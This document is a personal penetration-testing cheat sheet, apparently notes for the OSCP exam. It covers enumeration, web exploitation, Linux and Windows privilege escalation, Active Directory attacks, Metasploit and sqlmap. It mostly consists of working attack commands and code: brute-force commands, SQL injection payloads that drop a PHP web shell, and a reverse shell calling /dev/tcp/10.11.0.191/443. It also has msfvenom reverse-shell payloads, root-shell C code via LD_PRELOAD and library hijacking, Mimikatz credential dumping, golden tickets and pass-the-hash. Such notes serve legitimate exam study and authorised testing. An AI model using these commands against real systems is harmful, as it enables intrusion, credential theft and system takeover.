# **ENUMERATION**

Nmap -sT -p- -vvv -Pn RHOST

Nmap -sV -sC -p -Pn INTERESTING PORTS -o filename -vvv RHOST

Then try top UDP ports for hidden gems.

Nmap -sU –top-ports 20 -o filename -vvv RHOST

Full scan

sudo autorecon -pT:80,T:443,U:999 RHOST -v --exclude-tags dirbuster

- Exclude smb and do manually
- Also have to do gobuster manually

## **FTP (21/tcp)**

Check for an anonymous login and check to see if the specific FTP server has known vulnerabilities.

ftp IP (user: anonymous, pass: blank)
 passive
 binary
 put file/get file

If uploaded web shell (.aspx works best), access it through the correct port in browser. Then get proper reverse shell (try powershell/bash first). Otherwise, see if can execute nc.exe or msfvenom .exe.

hydra -L ~/Desktop/seclists/Usernames/top-usernames-shortlist.txt -P ~/Desktop/wordlists/rockyou.txt 192.168.13.236 ftp

## **SSH (22/tcp)**

Good place to try credentials. If I just know usernames, try hydra.

Hydra -t 4 -l $USERNAME -P /usr/share/wordlists/rockyou.txt ssh://$RHOST

## **SMTP (25/tcp)**

Can try to enumerate usernames.

Look for exploits (may need to change mail from and rcp to)

## **DNS (53/tcp)**

Enumerate with dnsenum and dnsrecon.

## **RPC/NFS (111/tcp)**

Enumerate RPC with nmap

Nmap -sV -p 111 –script=rpcinfo $RHOST

If I find NFS-related services, enumerate them with nmap

Nmap -p 111 –script nfs\* $RHOST

If I find NFS shares, I would mount them and see if I can read/write files or change my permissions by adding a new user.

Mount -t nfs -o vers=2 $RHOST:/SHARENAME /mnt

Groupadd –gid 1337 pwn

Useradd –uid 1337 -g pwn pwn

## **SMB (139/tcp and 445/tcp)**

Connect

smbclient //IP/SHARE -U user
 smbclient –no-pass -L //IP

Enumeration:

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p139,445 IP

- If write access to a share, probable exploit: searchsploit/google

enum4linux -a IP

Vuln scan:

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p139,445 \&lt;target\&gt;

Google specific version vulnerabilities.

Samba 4.0.1\&lt;version\&lt;4.11.1:

https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba\_symlink\_traversal/

## **SNMP (161/udp)**

If SNMP is running, try to extract useful information using common community strings and use tools to dump the data in a readable format.

Snmp-check $RHOST

Onesixtyone -c stringlistpath $RHOST

Snmpwalk -v1 -c public $RHOST

## **HTTP(S)** **(80/tcp, 443/tcp, 8000/tcp, 8080/tcp, 8443/tcp, ...)**


gobuster dir -u $RHOST -w seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt -o outfile

gobuster dir -u $RHOST -w seclists/Discovery/Web-Content/raft-large-words.txt -x .php,.html,.txt -o outfile

Nikto -h $RHOST -o outfile

For any services running, I would look for known vulnerabilities that can be exploited.

Login brute force:

hydra -l admin -P /usr/share/wordlists/rockyou.txt -s PORT IP http-post-form &quot;PATH:j\_username=^USER^&amp;j\_password=^PASS^:Invalid username or password&quot;

**Command injection**

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

**Token manipulation**

Manually (use [jwt.io](https://jwt.io/) to do the decoding/encoding)

![](RackMultipart20220117-4-mkfp9i_html_ef9d224d6a99d85a.png)

**File upload**

Try reverse shells with all the extensions listed below.

If one uploads, hope it executes automatically.

If it doesn&#39;t execute, may need to access through other means.

- If still doesn&#39;t work, add GIF89a; to the very beginning of shell.

![](RackMultipart20220117-4-mkfp9i_html_8a66226edccf83d5.png)

**SQL Injection**

On login portals (or any POST), try a correct username and one of the following

&#39; or 1=1--

&#39; or 1=1#

&#39; or 1=1/\*

&#39;) or &#39;1&#39;=&#39;1--

&#39;) or (&#39;1&#39;=&#39;1--

Try with &quot; too

For query parameters (e.g id), identify with

?id=1&#39;
 ?id=1&#39; --
 ?id=1&#39; #
 ?id=1&#39;/\*

And exploit with [https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli](https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli)

Find no. cols -\&gt; Find which col outputs to screen -\&gt; find table names -\&gt; Find column names from interesting tables -\&gt; extract interesting columns

If failing, look up DBMS specific guide from (or others)

[https://www.securityidiots.com/Web-Pentest/SQL-Injection/](https://www.securityidiots.com/Web-Pentest/SQL-Injection/)

Also try error based if this doesn&#39;t work but can see errors.

If MYSQL, try to upload reverse.php

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,&quot;\&lt;?php echo

shell\_exec($\_GET[&#39;cmd&#39;]);?\&gt;&quot;,6,7,8,9 into OUTFILE &#39;/var/www/html/cmd.php&#39;

or for windows

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,&quot;\&lt;?php echo

shell\_exec($\_GET[&#39;cmd&#39;]);?\&gt;&quot;,6,7,8,9 into OUTFILE &#39;c:/xampp/htdocs/cmd.php&#39;

then load it (remember OS)

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,&quot;\&lt;?php echo

shell\_exec($\_GET[&#39;cmd&#39;]);?\&gt;&quot;,6,7,8,9 into OUTFILE &#39;c:/xampp/htdocs/cmd.php&#39;

**LFI**

Try this when ?param= seen in URL. Can be used after text box executed.

First see if possible with fuzzing directory

ffuf -w ~/Desktop/wordlists/LFI/lfi.list -u http://URL?param=FUZZ

Find a property a lot of results have in common (e.g no. lines is 49) and filter it out using the options in the picture below (try dirTraversal-OS too)

ffuf -w ~/Desktop/wordlists/LFI/lfi.list -u http://URL?param=FUZZ -fl 49

![](RackMultipart20220117-4-mkfp9i_html_dbf4d113de75d2df.png)

If this has results, LFI is possible. See what worked (e.g ../../../../../../../../) and run the interesting files list with this (make sure to choose correct OS list)

ffuf -w ~/Desktop/wordlists/LFI/LFI-gracefulsecurity-linux.txt -u http://URL?param=../../../../../../../..FUZZ -fl 49

Then navigate to the interesting ones in browser (try /etc/passwd too bc doesn&#39;t work sometimes). If ssh seen, for example, research where keys are and navigate if possible.

- Could traverse to somewhere we saved shell from a different exploit to execute it

Could try this too

![](RackMultipart20220117-4-mkfp9i_html_9e0731b73bdad25d.png)

**RFI**

Try to execute file on web app via my web server

http://URL?param=http://\&lt;mymachine\&gt;/reverse.php

http://URL?param=http://\&lt;mymachine\&gt;/reverse.php%00

http://URL?param=http://\&lt;mymachine\&gt;/reverse.php?

reverse.php should contain this

\&lt;?php echo system(&quot;0\&lt;&amp;196;exec 196\&lt;\&gt;/dev/tcp/10.11.0.191/443; sh \&lt;&amp;196 \&gt;&amp;196 2\&gt;&amp;196&quot;); ?\&gt;

## **NFS (2049)**

Show mountable shares

Showmount -e IP

Mount share

Sudo mount -t nfs -o vers=2 IP:SHARE DIR

On victim machine, find a directory that has no\_root\_squash/no\_all\_squash set

Cat /etc/exports

If so, exploit.

## **Strange ports**

Try to connect to see what it is through browser or

Nc -nv IP PORT

Look to see if other ports are similar (e.g mail server and admin for mail port)

# **PRIVILEGE ESCALATION**

## **Linux**

For Linux systems, I would first run sudo -l to see if I have access to any sudo commands, which would likely be an easy route to escalation.

Also this to see which language exploits will work (check to see if PEAS does this)

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2\&gt;/dev/null

Then, run linPEAS (-a option if have time). Lse as backup.

Chmod +x linpeas.sh

./linpeas.sh

[**https://gtfobins.github.io/**](https://gtfobins.github.io/)

**Kernel**

linPEAS should tell us the kernel version (uname -a can too) and suggest exploits. Use these or google/exploitdb for others. Run but may need to revert and try something else if it fails.

**Service (processes)**

**Services running as root (also software information for more info)**

linPEAS will identify all processes running as root. If any look interesting (such as mysql), we can try to find the version number to look for a priv esc exploit. Can also access the service to see what there is.

![](RackMultipart20220117-4-mkfp9i_html_307a97b4843a1a7b.png)

![](RackMultipart20220117-4-mkfp9i_html_4c7beca8bf806e74.png)

**Port forwarding**

winPEAS will identify services running on localhost. If they are not accessible internally (because requires a browser, for example) can port forward to my machine

Ssh -R \&lt;myport\&gt;:127.0.1:\&lt;serviceport\&gt; \&lt;username\&gt;@\&lt;mymachine\&gt;

Then access it through localhost:\&lt;myport\&gt;

**Weak files permissions (interesting files)**

**Readable /etc/shadow**

Take password hash (between first and second colons) and crack it on kali.

Then use su to change to root

**Writable /etc/shadow**

On kali, generate new hash with new password (usually sha 512 but check if machine older)

Mkpasswd -m sha-512 newpassword

Copy entire hash and use it to replace the root user&#39;s hash in /etc/shadow/

Then use su to change to root

**Writable /etc/passwd**

On kali, generate new hash with new password

Openssl passwd &#39;newpassword&#39;

Copy entire hash and use it to replace the root user&#39;s x in /etc/passwd/

If can only append to the file, copy the root entry and paste it at the bottom. Then change the name to newroot and replace x with the hash.

Then use su to change to root (or newroot)

**Files with credentials in them (also software information)**

linPEAS will highlight files such as history, backups, and SSH files. But look around for .ssh folders. If ssh private key is found, copy it to kali and

chmod 600 key

ssh -i root@RHOST

**Sudo**

Check sudo -l first. If I can run as another user, can do sudo -u user ...

winPEAS identifies commands that can be run as sudo without a password. Cross reference these with [https://gtfobins.github.io/](https://gtfobins.github.io/) to find escalation method.

![](RackMultipart20220117-4-mkfp9i_html_b6723e652ab9a977.png)

Even if not on gtfobins, still look up if possible privesc (such as apache2).

**LD\_PRELOAD environment variable**

winPEAS shows if LD\_PRELOAD is an environment variable

![](RackMultipart20220117-4-mkfp9i_html_b91572be18aeff25.png)

If so, create a file called preload.c with the following

#include \&lt;stdio.h\&gt;
 #include \&lt;sys/types.h\&gt;
 #include \&lt;stdlib.h\&gt;

void \_init() {
 unsetenv(&quot;LD\_PRELOAD&quot;);
 setresuid(0,0,0);
 system(&quot;/bin/bash -p&quot;);
 }

Then compile

Gcc -fPIC -shared -nostartfiles -o /tm/preload.so preload.c

And run this sudo with any allowed command

Sudo LD\_PRELOAD=/tmp/preload.so \&lt;command\&gt;

**LD\_LIBRARY\_PATH environment variable**

winPEAS shows if LD\_PRELOAD is an environment variable

![](RackMultipart20220117-4-mkfp9i_html_b91572be18aeff25.png)

Run the following against any of the allowed sudo commands

Ldd FULLPATH/COMMAND

It will list shared objects. Pick one to replace, e.g libcrypt.so.1

Create a file called library\_path.c with the following

#include \&lt;stdio.h\&gt;
 #include \&lt;stdlib.h\&gt;

static void hijack() \_\_attribute\_\_((constructor));

void hijack() {
 unsetenv(&quot;LD\_LIBRARY\_PATH&quot;);
 setresuid(0,0,0);
 system(&quot;/bin/bash -p&quot;);
 }

Compile into a shared object with the same name as the one found earlier, e.g libcrypt.so.1

Gcc -o libcrypt.so.1 -shared -fPIC library\_path.c

Then use sudo with the command that was used earlier

Sudo LD\_LIBRARY\_PATH=. \&lt;command\&gt;

**Cron jobs (processes)**

**Writable cron job run by root**

linPEAS will identify these.

![](RackMultipart20220117-4-mkfp9i_html_9c71c49230261ef0.png)

If found, locate the file

locate \&lt;cron job file\&gt;

Check permissions to make sure it&#39;s writable and overwrite it with a reverse shell (of the filetype if possible)

Then listen on kali and wait for cron job to execute.

**PATH environment variable**

linPEAS will identify if a writable directory is included in the path

![](RackMultipart20220117-4-mkfp9i_html_3fc228f2420506b5.png)

This example shows that /home/user is first in the PATH (can still try if not first) and overwrite.sh does not have an absolute path, which is necessary. So, create a new (executable) overwrite.sh in /home/user that contains a reverse shell.

Then listen on kali and wait for cron job to execute.

**Wildcards**

First, show the contents of readable cron jobs (also need writable directory in PATH)

locate \&lt;cron job file\&gt;

cat \&lt;cron job file\&gt;

If there is a wildcard character \* in the file, check which command is using it (at the start of the line) and search gtfobins (and google) for ways exploit this using command line options. This means create files in writable PATH directory (e.g /home/user) with the name being what \* should be replaced with. E.g

Cron job has this line in it

Tar czf /tmp/backup.tar.gz \*

Gtfobins gives us this to spawn a shell

tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

So we need to create three files in /home/user. One is a reverse shell binary created with

msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=\&lt;IP\&gt; LPORT=\&lt;PORT\&gt; -f elf \&gt; reverse.elf

and the two with the names of command line options

touch ./--checkpoint=1

touch ./--checkpoint-action=exec=reverse.elf

Then listen on kali and wait for cron job to execute.

**SUID/SGID executables (interesting files)**

**Binary exploits**

winPEAS presents these

![](RackMultipart20220117-4-mkfp9i_html_f5e6fcd883563949.png)

Look on gtfobins to see if any of the known binaries have exploits. For unknown binaries, find the version

FULLPATH –version

Then look for exploits on the usual places.

I that doesn&#39;t work, try to execute the unknown binaries to see what they do and continue.

**Shared object injection**

Run strace to see if possible

Strace FULLPATH 2\&gt;&amp;1 |grep -iE &quot;open|access|no such file&quot;

If it tries to load a shared object (eg libcalc.so) from a writable directory, we can create it (and directories if needed). The (libcalc.c) file should have the following contents which just spawns a shell when loaded

#include \&lt;stdio.h\&gt;
 #include \&lt;stdlib.h\&gt;

static void hijack() \_\_attribute\_\_((constructor));

void hijack() {
 unsetenv(&quot;LD\_LIBRARY\_PATH&quot;);
 setresuid(0,0,0);
 system(&quot;/bin/bash -p&quot;);
 }

Then compile it

Gcc ishared -fPIC -o libcalc.so libcalc.c

Then execute the binary and gain root shall.

**PATH environment variable**

The unknown binaries may be calling other processes which can be used to privesc. View the contents of the binary to see if it is executing/starting another service

Strings FULLPATH

Confirm with

Strace -v -f -e execve /usr/local/bin/suid-env 2\&gt;&amp;1 | grep service

If the service command is being executed via a shell and service is not an absolute path, create a file called service.c with the following

int main {
 setuid(0);
 system(&quot;/bin/bash -p&quot;);
 }

Then compile

Gcc -o service service.c

Then prepend current directory to PATH and run the binary

PATH=.:$PATH FULLBINARYPATH

**Abusing shell features (Bash \&lt; 4.2-048)**

If the above wont work because the service is an absolute path, then try this. Find the version of the shell executing the service command, e.g

/bin/sh –version

If Bash version \&lt; 4.2-048, then

Function SERVICEABSOLUTEPATH { /bin/bash -p; }

Export -f SERVICEABSOLUTEPATH

Then execute the binary and get root shell.

**Abusing shell features (Bash \&lt; 4.4)**

If Bash version \&lt; 4.4, then

Env -I SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)&#39; FULLBINARYPATH

Run rootbash

/tmp/rootbash -p

**Interesting files**

If there are files that we can run as a higher privileged user, view it and see if anything the program does can be abused. For example, a python script imports a module that we can hijack (look at python path).

**Passwords and keys**

Lookout for passwords in winPEAS output and also references to credential files (ssh private keys or openvpn&#39;s auth-user-pass config option, for example).

## **Windows**

Whoami /all

Net user USERNAME to see which groups the user is part of

Tree /f /a from C:\Users directory to look for interesting files easily

Then run winPEAS

.\winPEASx64.exe from c:\windows\temp

If winPEAS doesn&#39;t work (first try the .bat), run PowerUp.

Powershell -exec bypass

. .\PowerUp.ps1

Invoke-AllChecks

**Kernel**

winPEAS should tell us the kernel version (systeminfo can too) and suggest exploits. Use these or google/exploitdb for others. Run but may need to revert and try something else if it fails.

Check for exploits:

Copy systeminfo output to kali

The use windows exploit suggester

Python2 wes.py systeminfo.txt -I &#39;Elevation of Privilege&#39; –exploits-only | more

Cross reference these with secwiki&#39;s list. If not, look on exploitdb etc.

Pre-compiled exploits:

https://github.com/SecWiki/windows-kernel-exploits

[https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)

https://github.com/rasta-mouse/Watson

**Service (Services information)**

**Weak service permissions:**

Identify with winPEAS

![](RackMultipart20220117-4-mkfp9i_html_b876383c71f07796.png)

Confirm with accesschk

Accesschk.exe /accepteula -uwcqv USER SERVICENAME

Must be able to start the service (and stop if running – check with sc query SERVICENAME)

Then exploit

Listen on kali

Sc stop (if running)

Sc config SERVICENAME binpath= &quot;FULLPATH\reverse.exe&quot;

Sc start

**Unquoted service paths:**

Identify with winPEAS

![](RackMultipart20220117-4-mkfp9i_html_51469f31a46feae6.png)

Confirm with accesschk

Accesschk.exe /accepteula -uwcqv USER SERVICENAME

Must be able to start the service (and stop if running – check with sc query SERVICENAME)

Then check which directory we can write in, e.g

Accesschk.exe /accepteula -uwdq &quot;C:\&quot;

Accesschk.exe /accepteula -uwdq &quot;C:\Program Files\&quot;

Accesschk.exe /accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;

Looking to see users in output and use that one

Then exploit

Listen on kali

Sc stop SERVICENAME (if needed)

Copy reverse.exe (from SMB if needed) to the directory and rename it accordingly, e.g

Copy FULLPATH\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;

Sc start SERVICENAME, e.g sc start unquotedsvc

**Weak registry permissions:**

Identify with winPEAS

![](RackMultipart20220117-4-mkfp9i_html_c6c29db44b4f953f.png)

Confirm with accesschk

Accesschk.exe /accepteula -uvwqk SERVICEPATH

Looking to see a group which we are part of (eg INTERACTIVE)

Also

Accesschk.exe /accepteula -uwcqv USER SERVICENAME

Must be able to start the service (and stop if running – check with sc query SERVICENAME)

Then exploit

Listen on kali

Sc stop SERVICENAME (if needed)

Reg add SERVICEPATH /v ImagePath /t REG\_EXPAND\_SZ /d FULLPATH\reverse.exe /f

Sc start SERVICENAME

**Insecure Service Executables:**

Identify with winPEAS

![](RackMultipart20220117-4-mkfp9i_html_1a09f7fb612edee2.png)

Confirm with accesschk

Accesschk.exe /accepteula -uwcqv USER SERVICENAME

Must be able to start the service (and stop if running – check with sc query SERVICENAME)

Then exploit

Listen on kali

Sc stop (if needed)

Copy /Y FULLPATH\reverse.exe SERVICEPATH

Sc start

**DLL hijacking:**

Identify with winPEAS

![](RackMultipart20220117-4-mkfp9i_html_7c881434e472de3c.png)

Can be done with any of the services listed as long as we can start/stop, so check each with accesschk

Accesschk.exe /accepteula -uwcqv USER SERVICENAME

Must be able to start the service (and stop if running – check with sc query SERVICENAME)

Copy service .exe file onto kali

Connect to windows 10 pwk client after reverting on website

sudo xfreerdp /u:administrator /p:lab /cert:ignore /v:192.168.163.10

Copy Procmon64.exe and the service .exe file onto this client

Run Procmon64.exe as admin

Stop and clear the current capture

Ctrl L, then process name in the left filter and service executable filename in box

Click add, then ok

Deselect show registry activity and show network activity

Start capture

On command prompt, start the service

Next to name not found with the correct directory (eg, C:\Temp), see .dll filename to use later

Create a .dll reverse shell with this name

Msfvenom -p windows/shell\_reverse\_tcp LHOST=IP LPORT=PORT -f dll \&gt; name.dll

Then exploit

Listen on kali

Copy FULLPATH\reverse.dll C:\Temp (not necessarily C:\Temp, look at winPEAS)

Sc stop SERVICENAME

Sc start SERVICENAME

**Registry**

**Autorun**

Need admin to login for this so unlikely but check https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#windows-1.

**AlwaysInstallElevated (Windows Credentials)**

Identify with winPEAS

![](RackMultipart20220117-4-mkfp9i_html_1e2357e4618800c6.png)

Need both to be set to 1

Use .msi reverse shell this time

msfvenom -p windows/shell\_reverse\_tcp LHOST=\&lt;IP\&gt; LPORT=\&lt;PORT\&gt; -f msi \&gt; reverse.msi

Then exploit

Listen on kali

Msiexec /quiet /qn /i reverse.msi

**Passwords**

Lookout for passwords in winPEAS output and also check manually to see if passwords accompany found usernames (for autologon, for example)

Spawn a shell with new credentials

Winexe -U &#39;user@password&#39; //RHOST cmd.exe (add –system if admin creds)

Manual search if absolutely necessary

Reg query HKLM /f password /t REG\_SZ /s

Reg query HKCU /f password /t REG\_SZ /s

**Saved Creds**

Run cmdkey /list and look for admin. If so, do the following

Listen on kali

Runas /savecred /user:admin FULLPATH\reverse.exe

**SAM and SYSTEM**

Move hash files to C:\

Reg save hklm\sam c:\sam

Reg save hklm\system c:\system

Also do that for SAM and SYSTEM that kali finds, e.g

Copy FULLPATH\SAM SMB

Copy FULLPATH\SYSTEM SMB

Then transfer to kali and

Samdump2 system sam

If the first part of the hash is the same across all users, use the second part to crack

Spawn a shell with new credentials

Winexe -U &#39;user@password&#39; //RHOST cmd.exe (add –system if admin creds)

**Passing the hash**

If have hash but cant crack it, pass the hash

Pth-winexe -U &#39;FULLHASH&#39; //RHOST cmd.exe (add –system if admin creds)

**Scheduled tasks**

Try

Get-ScheduledTask | where {$\_.TaskPath -notlike &quot;\Microsoft\*&quot;} | ft TaskName,TaskPath,State

Otherwise gotta look around for interesting scripts and read them

Then check permission and see what can be done

Accesschk.exe /accepteula -quv user SCRIPTNAME

If we can write, insert reverse shell.

Echo reverse.exe \&gt;\&gt; SCRIPTNAME

Wait til the script is run

**Insecure GUI apps**

If in RDP, open different GUI apps (e.g paint) and while they are running,

Tasklist /V | findstr mspaint.exe

If running as admin,

File \&gt; Open \&gt; file://c:/windows/system32/cmd.exe at top

**Startup apps**

Need admin to login for this so unlikely but check https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#windows-1.

**Installed apps (Proccesses information)**

Look for interesting programs in winPEAS and search for exploits

**Hot potato**

Works on Windows 7, 8, and early 10 but winPEAS should suggest it

https://github.com/foxglovesec/Potato

**Token impersonation**

See which privileges the service has

Whoami /priv

Particularly interesting are SeImpersonatePrivilege or SeAssignPrimaryToken but check OS version for which exploit to use.

Check which privileges are useful here

[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

USER privileges are very useful too, and they don&#39;t even have to be enabled.

**Port forwarding**

winPEAS identifies services running on localhost. These can be vulnerable (check what it is with nc) so we need to make them available externally.

SSH needs to be available on kali so edit /etc/ssh/sshd\_config and make sure permitrootlogin is set to yes

Then service ssh restart

Now start the link from windows

Plink.exe root@\&lt;mymachine\&gt; -R \&lt;serviceport\&gt;:127.0.0.1:\&lt;serviceport\&gt;

This method can also be used to make processes work such as winexe which runs on port 445. This needs to be done if winexe hangs (remember to kill SMB on kali pkill –full smbserver.py). Then run winexe on 127.0.0.1.

**Extras**

To go from local admin to SYSTEM, use PsEXEC.exe

.\PsExec.exe -i -s &quot;c:\temp\rev.bat&quot;

Getsystem on meterpreter also does this.

If winPEAS doesn&#39;t turn up anything, try other scripts such as powerup and browse the directories.

# **ACTIVE DIRECTORY**

First add entry to /etc/hosts: IP CONTROLLER.local

Use Kerbrute to enumerate users:

./kerbrute userenum –dc CONTROLLER.local -d CONTROLLER.local Userlist.txt

Use Rubeus (or impacket) to harvest tickets (for passing the ticket attacks) and spray passwords:

Rubeus.exe harvest /interval:30

Rubeus.exe brute /password:Password /noticket

Use Rubeus (or impacket) for kerberoasting, so it will dump the Kerberos hash of any vulnerable users, which can then be cracked offline:

Rubeus.exe kerberoast

Hashcat -m 13100 -a 0 hash.txt Passlist.txt --force

Also use Rubeus (impacket) to dump the AS-REP hashes of vulnerable users and crack them:

Rubeus.exe asreproast

Hashcat -m 18200 hash.txt Passlist.txt --force

Use Mimikatz to dump tickets from the LSASS memory and then pass the tickets:

Run command prompt as admin

Mimikatz.exe

Privilege::debug

Sekurlsa::tickets /export

Kerberos::ptt \&lt;ticket\&gt; (look for admin krbtgt)

Klist

Use Mimkatz for golden/silver ticket attacks. First dump the hash, then create the ticket and use it.

Mimkatz.exe

Privilege::debug

Lsadump::lsa /inject /name:krbtgt

Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:

Misc::cmd

# **MISCELLANEOUS**

**File transfers**

Start a python server in the relevant directory.

python -m SimpleHTTPServer port

On Linux, use wget to access the server.

On windows:

powershell -c (New-Object Net.WebClient).DownloadFile(&#39;http://_ip-addr_ **:** _port_/_file_ **&#39;, &#39;** _output-file-full-path_**&#39;)**

or SMB below

From victim to me (linux scp):

Sudo systemctl start ssh.socket (on me)

Scp filename kali@IP:destinationpath (on victim)

Sudo systemctl stop ssh.socket (on me)

From victim to me (windows smb):

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . (on me)

Copy filepath [\\$LHOST\](////%24LHOST/shae)kali\ (on victim)

- Can also copy from smb to windows

**Downloading raw github files**

Use wget and change to raw.githubusercontent.com and remove /blob

**Upgrade to BASH**

python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;

If that fails, do first:

export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

**Reverse shells**

[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

/usr/share/webshells

**Find directory or file**

Find / -name dirname

Locate filename

**Delete folder**

Sudo rm -rf \&lt;foldername\&gt;

**Run python 2 scripts**

Pyenv global 2.7.18

. ./myvenv/bin/activate

Do stuff like pip2 install ... or python xxx.py

Pyenv global system

**Finding exploits**

Start with quick .py scripts

If an exploitdb exploit doesn&#39;t work, someone on github may have a fixed version so google.

# **METASPLOIT**

Search to find exploit similar to exploit-DB

Search vuln

Select exploit

Use exploitnum

Set options

Options

Set option value

Background session:

Background

Switch sessions:

Sessions -l

Sessions -i sessionnum

Catch reverse shell:

Use exploit/multi/handler

Set payload ... (to same as msfvenom)

Check if vulnerable:

check

**Meterpreter**

Switch to normal shell: shell

Whoami: getuid

Upload file: upload \&lt;src file\&gt; \&lt;dst file\&gt;

Download file: download \&lt;src file\&gt; \&lt;dst file\&gt;

Port forwarding: portfwd -L \&lt;locahost\&gt; -l \&lt;localport\&gt; -r \&lt;remotehost\&gt; -p \&lt;remoteport\&gt;

Edit file: edit \&lt;file\&gt;

Pwd: getwd

Ifconfig: ipconfig

Powershell: load powershell

Hashdump

# **SQLMAP**

List all databases at the site

sqlmap -u &quot;http://testsite.com/login.php&quot; --dbs

List all tables in a specific database

sqlmap -u &quot;http://testsite.com/login.php&quot; -D site\_db --tables

Dump the contents of a DB table

sqlmap -u &quot;http://testsite.com/login.php&quot; -D site\_db -T users –dump

Dump a table from a database when you have admin credentials

sqlmap -u &quot;http://testsite.com/login.php&quot; –method &quot;POST&quot; –data &quot;username=admin&amp;password=admin&amp;submit=Submit&quot; -D social\_mccodes -T users –dump

Get OS Shell

sqlmap --dbms=mysql -u &quot;http://testsite.com/login.php&quot; --os-shell

# **Terminator**

Win + s to create new terminal down

Win + d to create new terminal right

Alt + direction to move between then

Ctrl + shift + w to close terminal

Ctrl + alt + w to rename

Ctrl + arrow keys to move word by word

Alt + backspace to delete word by word

Home and end to go to front and back

Ctrl + u to delete entire line from cursor

Ctrl + r to search history

Ctrl + alt + d to see and unsee desktop

Ctrl + shift + x to focus and unfocus

[https://forum.hackthebox.com/t/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt/1471](https://forum.hackthebox.com/t/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt/1471)

https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration

https://www.linkedin.com/pulse/oscp-essentials-ernesto-arias

https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1097814569
